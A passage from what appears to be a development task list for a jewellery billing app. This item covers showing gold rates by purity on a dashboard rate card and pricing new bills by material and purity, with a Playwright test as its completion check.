  do="Gold rates by purity (24K, 22K, 20K, 18K) on the rate card, and a new bill takes the rate of its piece's material and purity.",
  files=["src/app/components/DashboardRateCard.tsx", "src/app/billing-pos/components/BillingPOSClient.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/rates-purity.spec.ts` passes (PT-W17) with rates for 22K and 18K.",
  rollback=RBW)
